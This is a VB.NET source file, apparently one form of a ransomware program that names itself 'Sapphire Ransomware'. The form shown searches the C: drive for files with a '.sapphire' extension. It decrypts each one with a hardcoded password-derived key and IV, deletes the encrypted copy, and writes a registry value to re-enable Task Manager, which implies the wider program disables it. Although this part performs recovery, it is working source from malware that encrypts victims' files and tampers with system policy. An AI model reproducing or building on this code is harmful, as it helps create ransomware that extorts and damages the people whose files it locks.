Public Class Form3
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim filenamez As String
        Dim RegistryKey As Object

        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            MsgBox("Files Decrypted.", MsgBoxStyle.Information, "Sapphire Ransomware")
            RegistryKey = CreateObject("WScript.Shell")
            RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
            Application.ExitThread()


        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)

            Try
                'Declare variables for the key and iv.
                'The key needs to hold 256 bits and the iv 128 bits.
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = Form1.CreateKey("Sapphire_is_a_good_color")
                'Send the password to the CreateIV function.
                bytIV = Form1.CreateIV("Sapphire_is_a_good_color")
                'Start the decryption.

                Dim withParts As String = "Books and Chapters and Pages"
                Dim filenamezu As String = Replace(filenamez, ".sapphire", "")
                Form1.EncryptOrDecryptFile(filenamez, filenamezu,
                                     bytKey, bytIV, Form1.CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try

            ProgressBar1.Increment(1)
            Label2.Text = filenamez
        End If
    End Sub

    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each foundFile As String In My.Computer.FileSystem.GetFiles("C:", FileIO.SearchOption.SearchAllSubDirectories)
            If foundFile.EndsWith(".sapphire") Then
                ListBox1.Items.Add(foundFile)
            End If
        Next
    End Sub
End Class